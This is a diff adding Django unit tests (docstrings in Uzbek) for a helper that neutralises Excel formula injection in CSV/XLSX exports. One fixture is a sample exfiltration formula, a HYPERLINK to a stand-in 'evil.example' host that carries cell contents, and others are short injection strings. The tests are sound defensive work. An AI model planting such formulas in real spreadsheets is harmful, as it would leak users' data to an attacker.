@@ -65,3 +65,46 @@ class DrainRequestBodyMiddlewareTests(SimpleTestCase):
         request = self._request(b'x' * 64)
         request._stream = Broken()
         self.assertEqual(self._run(request), 'response')
+
+
+class SpreadsheetSafeTests(SimpleTestCase):
+    """`spreadsheet_safe` — CSV/XLSX eksportida Excel formula injection himoyasi.
+
+    `full_name` foydalanuvchi yozadigan matn (serializer'da faqat
+    `max_length=120`) va to'g'ridan-to'g'ri katakchaga yozilsa Excel uni
+    formula deb bajaradi.
+    """
+
+    def test_formula_prefixes_are_neutralized(self):
+        from .export_utils import spreadsheet_safe
+
+        for value in ('=1+1', '+1', '-1', '@SUM(A1)', '\t=cmd', '\r=cmd'):
+            self.assertEqual(spreadsheet_safe(value), f"'{value}", value)
+
+    def test_hyperlink_payload_is_neutralized(self):
+        from .export_utils import spreadsheet_safe
+
+        payload = '=HYPERLINK("http://evil.example/"&A1,"Bosing")'
+        self.assertEqual(spreadsheet_safe(payload), f"'{payload}")
+
+    def test_ordinary_text_is_untouched(self):
+        from .export_utils import spreadsheet_safe
+
+        self.assertEqual(spreadsheet_safe("Ali Valiyev"), 'Ali Valiyev')
+        self.assertEqual(spreadsheet_safe('+998901234567'), "'+998901234567")
+
+    def test_non_string_values_keep_their_type(self):
+        """Sonlarga apostrof qo'shilmaydi — aks holda Excel'da saralash buzilardi."""
+        from .export_utils import spreadsheet_safe
+
+        self.assertEqual(spreadsheet_safe(42), 42)
+        self.assertEqual(spreadsheet_safe(3.5), 3.5)
+        self.assertEqual(spreadsheet_safe(None), '')
+
+    def test_row_helper_applies_to_every_column(self):
+        from .export_utils import spreadsheet_safe_row
+
+        self.assertEqual(
+            spreadsheet_safe_row(['=evil', 'ok', 7]),
+            ["'=evil", 'ok', 7],
+        )
